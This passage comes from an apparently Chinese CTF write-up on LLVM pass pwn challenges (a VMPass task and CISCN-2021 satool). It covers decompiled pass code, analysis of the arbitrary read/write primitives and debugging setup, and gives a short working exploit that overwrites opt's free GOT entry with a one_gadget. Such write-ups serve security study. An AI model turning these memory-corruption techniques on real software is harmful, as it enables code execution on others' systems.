class="comment">// [rsp+70h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+78h] [rbp-158h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+A0h] [rbp-130h]</span></span><br><span class="line">  llvm::ConstantInt *v19; <span class="comment">// [rsp+A8h] [rbp-128h]</span></span><br><span class="line">  <span class="keyword">void</span> *v20; <span class="comment">// [rsp+B0h] [rbp-120h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+B8h] [rbp-118h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+E0h] [rbp-F0h]</span></span><br><span class="line">  llvm::ConstantInt *v23; <span class="comment">// [rsp+E8h] [rbp-E8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v24; <span class="comment">// [rsp+F0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+F8h] [rbp-D8h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+110h] [rbp-C0h]</span></span><br><span class="line">  llvm::ConstantInt *v27; <span class="comment">// [rsp+118h] [rbp-B8h]</span></span><br><span class="line">  _QWORD *v28; <span class="comment">// [rsp+120h] [rbp-B0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+128h] [rbp-A8h]</span></span><br><span class="line">  __int64 ZExtValue; <span class="comment">// [rsp+140h] [rbp-90h]</span></span><br><span class="line">  llvm::ConstantInt *v31; <span class="comment">// [rsp+148h] [rbp-88h]</span></span><br><span class="line">  _QWORD *v32; <span class="comment">// [rsp+150h] [rbp-80h]</span></span><br><span class="line">  __int64 ArgOperand; <span class="comment">// [rsp+158h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> *s1; <span class="comment">// [rsp+168h] [rbp-68h]</span></span><br><span class="line">  llvm::CallBase *v35; <span class="comment">// [rsp+170h] [rbp-60h]</span></span><br><span class="line">  llvm::Instruction *v36; <span class="comment">// [rsp+180h] [rbp-50h]</span></span><br><span class="line">  _QWORD *Name; <span class="comment">// [rsp+1A8h] [rbp-28h]</span></span><br><span class="line">  __int64 v38; <span class="comment">// [rsp+1B8h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v39[<span class="number">2</span>]; <span class="comment">// [rsp+1C0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v39[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v39[<span class="number">0</span>] = llvm::BasicBlock::begin(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v38 = llvm::BasicBlock::end(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v39, &amp;v38) &amp; <span class="number">1</span>) == <span class="number">0</span> )<span class="comment">//基本是固定的LLVM遍历套路</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;&gt;(v39);</span><br><span class="line">      <span class="comment">//这里的55即操作码,查询对应文档为PHINode操作码，不是很懂这个</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::Instruction::getOpcode(v36) == <span class="number">55</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//获取指令</span></span><br><span class="line">      v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);</span><br><span class="line">      <span class="keyword">if</span> ( v35 )</span><br><span class="line">      &#123;</span><br><span class="line">        s1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          <span class="comment">//获取函数名称</span></span><br><span class="line">        CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);</span><br><span class="line">        Name = (_QWORD *)llvm::Value::getName(CalledFunction);</span><br><span class="line">        *(_QWORD *)s1 = *Name;</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">1</span>) = Name[<span class="number">1</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">2</span>) = Name[<span class="number">2</span>];</span><br><span class="line">        *((_QWORD *)s1 + <span class="number">3</span>) = Name[<span class="number">3</span>];</span><br><span class="line">          <span class="comment">//处理pop函数</span></span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;pop&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">         <span class="comment">//如果函数参数是2，这里把pop函数名称本身当作了一个参数，所以实际上pop函数应该只有一个参数</span></span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="comment">//获取pop函数的第一个参数</span></span><br><span class="line">            ArgOperand = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v32 = <span class="number">0LL</span>;</span><br><span class="line">            v31 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(ArgOperand);</span><br><span class="line">            <span class="keyword">if</span> ( v31 )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//解析参数值</span></span><br><span class="line">              ZExtValue = llvm::ConstantInt::getZExtValue(v31);</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">1</span> )</span><br><span class="line">                v32 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( ZExtValue == <span class="number">2</span> )</span><br><span class="line">                v32 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">              <span class="comment">//做一些操作，实际调试一下就行</span></span><br><span class="line">            <span class="keyword">if</span> ( v32 )</span><br><span class="line">            &#123;</span><br><span class="line">              v3 = off_20DFD8;</span><br><span class="line">              *v32 = *(_QWORD *)*off_20DFD8;</span><br><span class="line">              *v3 = (<span class="keyword">char</span> *)*v3 - <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//和pop类似</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;push&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v29 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v28 = <span class="number">0LL</span>;</span><br><span class="line">            v27 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v29);</span><br><span class="line">            <span class="keyword">if</span> ( v27 )</span><br><span class="line">            &#123;</span><br><span class="line">              v26 = llvm::ConstantInt::getZExtValue(v27);</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">1</span> )</span><br><span class="line">                v28 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v26 == <span class="number">2</span> )</span><br><span class="line">                v28 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v28 )</span><br><span class="line">            &#123;</span><br><span class="line">              v4 = off_20DFD8;</span><br><span class="line">              *off_20DFD8 = (<span class="keyword">char</span> *)*off_20DFD8 + <span class="number">8</span>;</span><br><span class="line">              *(_QWORD *)*v4 = *v28;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//1:**off_20DFD0 = *off_20DFC0</span></span><br><span class="line">          <span class="comment">//2:**off_20DFC0 = *off_20DFD0</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;store&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v25 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v24 = <span class="number">0LL</span>;</span><br><span class="line">            v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);</span><br><span class="line">            <span class="keyword">if</span> ( v23 )</span><br><span class="line">            &#123;</span><br><span class="line">              v22 = llvm::ConstantInt::getZExtValue(v23);</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">1</span> )</span><br><span class="line">                v24 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v22 == <span class="number">2</span> )</span><br><span class="line">                v24 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v24 == off_20DFD0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFD0 = *(_QWORD *)off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( v24 == off_20DFC0 )</span><br><span class="line">            &#123;</span><br><span class="line">              **(_QWORD **)off_20DFC0 = *(_QWORD *)off_20DFD0;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//arg0: 1 -&gt; *off_20DFD0 = **off_20DFC0</span></span><br><span class="line">          <span class="comment">//arg0: 2 -&gt; *off_20DFC0 = **off_20DFD0</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;load&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v21 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v20 = <span class="number">0LL</span>;</span><br><span class="line">            v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">            <span class="keyword">if</span> ( v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              v18 = llvm::ConstantInt::getZExtValue(v19);</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">1</span> )</span><br><span class="line">                v20 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v18 == <span class="number">2</span> )</span><br><span class="line">                v20 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFD0 )</span><br><span class="line">              *(_QWORD *)off_20DFC0 = **(_QWORD **)off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v20 == off_20DFC0 )</span><br><span class="line">              *(_QWORD *)off_20DFD0 = **(_QWORD **)off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//arg0: 1 -&gt; *off_20DFD0 += arg1</span></span><br><span class="line">          <span class="comment">//arg0: 2 -&gt; *off_20DFC0 += arg1</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;add&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v17 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">            v16 = <span class="number">0LL</span>;</span><br><span class="line">            v15 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">            <span class="keyword">if</span> ( v15 )</span><br><span class="line">            &#123;</span><br><span class="line">              v14 = llvm::ConstantInt::getZExtValue(v15);</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">1</span> )</span><br><span class="line">                v16 = off_20DFD0;</span><br><span class="line">              <span class="keyword">if</span> ( v14 == <span class="number">2</span> )</span><br><span class="line">                v16 = off_20DFC0;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v16 )</span><br><span class="line">            &#123;</span><br><span class="line">              v13 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">              v12 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);</span><br><span class="line">              <span class="keyword">if</span> ( v12 )</span><br><span class="line">                *v16 += llvm::ConstantInt::getZExtValue(v12);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">          <span class="comment">//arg0: 1 -&gt; *off_20DFD0 -= arg1</span></span><br><span class="line">          <span class="comment">//arg0: 2 -&gt; *off_20DFC0 -= arg1</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;min&quot;</span>) &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)llvm::CallBase::getNumOperands(v35) == <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = llvm::CallBase::getArgOperand(v35, <span class="number">0</span>);</span><br><span class="line">          v10 = <span class="number">0LL</span>;</span><br><span class="line">          v9 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v11);</span><br><span class="line">          <span class="keyword">if</span> ( v9 )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = llvm::ConstantInt::getZExtValue(v9);</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">              v10 = off_20DFD0;</span><br><span class="line">            <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">              v10 = off_20DFC0;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v10 )</span><br><span class="line">          &#123;</span><br><span class="line">            v7 = llvm::CallBase::getArgOperand(v35, <span class="number">1u</span>);</span><br><span class="line">            v6 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v7);</span><br><span class="line">            <span class="keyword">if</span> ( v6 )</span><br><span class="line">              *v10 -= llvm::ConstantInt::getZExtValue(v6);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(s1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,<span class="literal">false</span>,<span class="literal">false</span>,<span class="keyword">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v39,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>总体总结如下，<code>pop</code>和<code>push</code>与漏洞没什么关系</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">store:</span><br><span class="line">    arg0:1 -&gt; **off_20DFC0 = *off_20DFD0</span><br><span class="line">    arg0:2 -&gt; **off_20DFD0 = *off_20DFC0</span><br><span class="line">    </span><br><span class="line">load:</span><br><span class="line">    arg0: 1 -&gt; *off_20DFC0 = **off_20DFD0</span><br><span class="line">    arg0: 2 -&gt; *off_20DFD0 = **off_20DFC0</span><br><span class="line">    </span><br><span class="line">add:</span><br><span class="line">    arg0: 1 -&gt; *off_20DFD0 += arg1</span><br><span class="line">    arg0: 2 -&gt; *off_20DFC0 += arg1 </span><br><span class="line">    </span><br><span class="line">min:</span><br><span class="line">    arg0: 1 -&gt; *off_20DFD0 -= arg1</span><br><span class="line">    arg0: 2 -&gt; *off_20DFC0 -= arg1</span><br></pre></td></tr></table></div></figure>

<p>相当于现在可控任意两个指针<code>reg1/reg2</code>，并且可以取其中一个指针的值赋值给另一个指针。</p>

        <h3 id="简单调试"   >
          <a href="#简单调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单调试" class="headerlink" title="简单调试"></a>简单调试</h3>
      <p>先写一下简单程序调试一下，由于题目给的是<code>opt-8</code>，所以最好我们安装的也是对应版本的，即</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install clang-8</span><br><span class="line">sudo apt install llvm-8</span><br></pre></td></tr></table></div></figure>

<p>对应的调试程序为</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> num, <span class="keyword">long</span> <span class="keyword">long</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> num, <span class="keyword">long</span> <span class="keyword">long</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(<span class="keyword">int</span> num)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(<span class="keyword">int</span> num)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">o0o0o0o0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    load(<span class="number">2</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">    store(<span class="number">2</span>);</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x1000</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x1000</span>);</span><br><span class="line">    min(<span class="number">1</span>, <span class="number">0x1000</span>);</span><br><span class="line">    min(<span class="number">1</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>使用命令<code>clang-8 -emit-llvm -S myDebug.c -o myDebug.ll</code>编译生成<code>myDebug</code>，随后在<code>IDA</code>进行远程调试，如下配置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230828150159620.png" alt="image-20230828150159620"></p>
<p>即可进行调试，通过调试可以想出利用步骤如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">reg1 = 0</span><br><span class="line">reg2 = 0</span><br><span class="line"></span><br><span class="line">add(1,free_got)</span><br><span class="line">//控制reg1指针为opt程序中的got表地址free_got</span><br><span class="line">reg1 += free_got</span><br><span class="line"></span><br><span class="line">load(1)</span><br><span class="line">reg2 = *reg1 = free_addr</span><br><span class="line">//使得reg2指针为free_addr</span><br><span class="line"></span><br><span class="line">add(2,offset)</span><br><span class="line">//使得reg2指针为one_gadget</span><br><span class="line"></span><br><span class="line">store(1)</span><br><span class="line">//将reg2指针的值one_gadget赋值给reg1指向的值，即修改free_got为one_gadget</span><br></pre></td></tr></table></div></figure>


        <h3 id="漏洞利用"   >
          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p><code>checksec</code>一下<code>opt</code>，一般不存在<code>PIE</code>，那么指向<code>opt</code>程序的<code>got</code>表就很轻松了，最终<code>exp</code>如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">store</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load</span><span class="params">(<span class="keyword">int</span> a)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">o0o0o0o0</span><span class="params">()</span></span>&#123;</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">0x77e100</span>);</span><br><span class="line">    load(<span class="number">1</span>);</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0</span> - <span class="number">0x9a6d0</span> + <span class="number">0xe3b04</span>);</span><br><span class="line">    store(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>使用命令编译后运行即可</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang-8 -emit-llvm -S myExp.c -o myExp.ll</span><br><span class="line">opt-8 -load ./VMPass.so -VMPass myExp.ll</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是，这里修改的是<code>opt</code>程序中的<code>free_got</code>，也需要程序<code>opt</code>程序调用才行，同时满足一些寄存器的设置，那么有时候可能不太满足<code>One_gadget</code>，那么多试试几个<code>got</code>也行。另外<code>IDA</code>远程调试的时候一些偏移可能有点问题，最好还是在<code>gdb</code>中寻找，使用如下命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./opt-8</span><br><span class="line">set args -load ./VMPass.so -VMPass ./myExp.ll</span><br></pre></td></tr></table></div></figure>

<p>同时有时候从<code>opt-8</code>开始的时候不好确定加载的<code>.so</code>是在什么时候加载的，通常是<code>winmt</code>师傅找到的如下情况</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/949925_AFDQ35JVS6KKT6Y.png" alt="img"></p>

        <h2 id="CISCN-2021-satool"   >
          <a href="#CISCN-2021-satool" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN-2021-satool" class="headerlink" title="CISCN-2021-satool"></a>CISCN-2021-satool</h2>
      
        <h3 id="漏洞分析-1"   >
          <a href="#漏洞分析-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3>
      <p>分析漏洞，老套路，搜索<code>vtable</code>和<code>start</code>函数，得到<code>runOnFunction</code>函数和位置注册名为<code>SAPass</code>，进入分析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094305721.png" alt="image-20230829094305721"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094320046.png" alt="image-20230829094320046"></p>
<p>进入runOnFunction进行分析，首先是获取到解析的函数名称，这是硬编码的小端序</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094428297.png" alt="image-20230829094428297"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094523936.png" alt="image-20230829094523936"></p>
<p>那么实际匹配的函数名称应该为<code>B4ckDo0r</code>，之后就有一堆奇奇怪怪的代码，暂时先不用管，仔细寻找字符串匹配的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094630811.png" alt="image-20230829094630811"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094642785.png" alt="image-20230829094642785"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094654104.png" alt="image-20230829094654104"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829094701499.png" alt="image-20230829094701499"></p>

        <h3 id="简单调试-1"   >
          <a href="#简单调试-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#简单调试-1" class="headerlink" title="简单调试"></a>简单调试</h3>
      <p>再简单写一个例子，通过调试进行分析，可以确定大致的函数名称、参数对应的模板如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">char</span> *a, <span class="keyword">char</span> *b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stealkey</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fakekey</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	save(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    takeaway(<span class="number">0</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(<span class="number">0x1111</span>);</span><br><span class="line">	run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>在调试过程中发现涉及到堆，但是<code>IDA</code>不太好查看堆的结构，可以用一下插件：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/danigargu/heap-viewer" >danigargu/heap-viewer: IDA Pro plugin to examine the glibc heap, focused on exploit development (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>最终发现那一堆乱七八糟的代码都是一些检查，最终的函数大致功能如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">save:</span><br><span class="line">	save(arg0,arg1);</span><br><span class="line">	byte_2040f8 = chunk_addr</span><br><span class="line">	//申请0x18的chunk，将arg0的内容放到chunk，arg1的内容放到chunk + 8</span><br><span class="line">	//如果申请了0x10及以上的chunk，由于判断代码会导致释放，不过其实也可以溢出的，只是会释放而已。</span><br><span class="line">	//这个应该也可以进行相关利用的</span><br><span class="line"></span><br><span class="line">takeaway:</span><br><span class="line">	//不分析，和漏洞无关</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">stealkey:</span><br><span class="line">	stealkey()</span><br><span class="line">	//将*byte_2040f8赋值给byte_204100</span><br><span class="line"></span><br><span class="line">fakekey:</span><br><span class="line">	fakekey(arg0)</span><br><span class="line">	*byte_2040f8 = byte_204100 + arg0</span><br><span class="line">	</span><br><span class="line">run:</span><br><span class="line">	*byte_2040f8()</span><br></pre></td></tr></table></div></figure>


        <h3 id="漏洞利用-1"   >
          <a href="#漏洞利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p>那么申请残留<code>libc</code>的<code>chunk</code>，修改残留的<code>libc</code>地址为<code>one_gadget</code>即可，然后<code>run</code>即可完成利用，在<code>save</code>的<code>malloc</code>之前下断点，查看堆状态</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829141734303.png" alt="image-20230829141734303"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230829141743890.png" alt="image-20230829141743890"></p>
